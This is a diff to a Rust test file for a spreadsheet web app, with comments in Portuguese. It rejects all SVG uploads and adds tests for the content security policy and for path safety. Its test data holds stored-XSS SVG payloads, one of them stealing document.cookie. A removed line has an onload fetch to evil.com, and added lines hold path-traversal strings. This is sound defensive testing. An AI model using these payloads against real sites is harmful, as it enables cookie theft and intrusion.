@@ -11,21 +11,18 @@ fn test_image_magic_bytes_validation() {
     let fake_exe = b"MZ\x90\x00\x03\x00\x00\x00";
     assert!(validate_image_magic_bytes(fake_exe).is_err());
 
-    // Valid SVG
-    let safe_svg = b"<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\"><circle cx=\"50\" cy=\"50\" r=\"40\"/></svg>";
-    assert_eq!(validate_image_magic_bytes(safe_svg).unwrap(), ("image/svg+xml", "svg"));
-
-    // Malicious SVG with <script> - Stored XSS attempt
-    let xss_svg_script = b"<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(document.cookie)</script></svg>";
-    assert!(validate_image_magic_bytes(xss_svg_script).is_err());
-
-    // Malicious SVG with onload handler
-    let xss_svg_onload = b"<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"fetch('http://evil.com')\"></svg>";
-    assert!(validate_image_magic_bytes(xss_svg_onload).is_err());
-
-    // Malicious SVG with foreignObject
-    let xss_svg_foreign = b"<svg xmlns=\"http://www.w3.org/2000/svg\"><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>";
-    assert!(validate_image_magic_bytes(xss_svg_foreign).is_err());
+    // Nenhum SVG é aceito, nem os "inofensivos": a antiga lista de palavras proibidas
+    // deixava passar eventos como onbegin/onfocus e `javascript:` com entidades HTML
+    let svgs: [&[u8]; 5] = [
+        b"<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\"><circle cx=\"50\" cy=\"50\" r=\"40\"/></svg>",
+        b"<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(document.cookie)</script></svg>",
+        b"<svg xmlns=\"http://www.w3.org/2000/svg\"><animate onbegin=\"alert(1)\" attributeName=\"x\" dur=\"1s\"/></svg>",
+        b"<svg xmlns=\"http://www.w3.org/2000/svg\"><a href=\"&#106;avascript:alert(1)\"><text>x</text></a></svg>",
+        b"<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\" onfocus=\"alert(1)\" tabindex=\"0\"></svg>",
+    ];
+    for svg in svgs {
+        assert!(validate_image_magic_bytes(svg).is_err(), "SVG não deve ser aceito: {}", String::from_utf8_lossy(svg));
+    }
 }
 
 #[test]
@@ -76,6 +73,43 @@ fn test_security_headers_and_csp_strictness() {
         content.contains("public, max-age=31536000, immutable"),
         "❌ Assets estáticos imutáveis (fontes e wasm) devem ter cache-control de 1 ano!"
     );
+}
+
+#[test]
+fn test_content_security_policy_blocks_inline_scripts() {
+    use mta_sheet::server::middleware::security::content_security_policy;
+
+    // Páginas: nada de 'unsafe-inline' nos scripts; o nonce da renderização entra quando existe
+    let page = content_security_policy("/sheet/abc", Some("n0nce"));
+    let script_src = page.split(';').find(|d| d.trim().starts_with("script-src")).expect("script-src");
+    assert!(!script_src.contains("'unsafe-inline'"), "script-src não pode ter 'unsafe-inline': {}", script_src);
+    assert!(script_src.contains("'nonce-n0nce'"));
+    assert!(script_src.contains("'wasm-unsafe-eval'"));
+    assert!(page.contains("object-src 'none'") && page.contains("base-uri 'self'"));
+
+    // Respostas sem renderização (API, arquivos): mesma política, sem nonce
+    let without_nonce = content_security_policy("/api/get_sheets", None);
+    assert!(!without_nonce.contains("nonce-"));
+    let api_script_src = without_nonce.split(';').find(|d| d.trim().starts_with("script-src")).expect("script-src");
+    assert!(!api_script_src.contains("'unsafe-inline'"));
+
+    // Arquivos enviados por usuários: nada executa
+    let uploads = content_security_policy("/uploads/sheets/x/profile/a.png", None);
+    assert!(uploads.contains("default-src 'none'"));
+    assert!(uploads.contains("sandbox"));
+    assert!(!uploads.contains("script-src"));
+}
+
+#[test]
+fn test_upload_destinations_cannot_escape_the_uploads_folder() {
+    use mta_sheet::state::server_fns::is_safe_path_segment;
+
+    assert!(is_safe_path_segment("wonders"));
+    assert!(is_safe_path_segment("6f1c2d3e-aaaa-bbbb-cccc-1234567890ab"));
+    assert!(is_safe_path_segment("temp"));
+    for bad in ["", "..", "../etc", "a/b", "a\\b", "x y", "nome.png", "%2e%2e", &"a".repeat(65)] {
+        assert!(!is_safe_path_segment(bad), "segmento deveria ser recusado: {:?}", bad);
+    }
 }
 
 #[test]
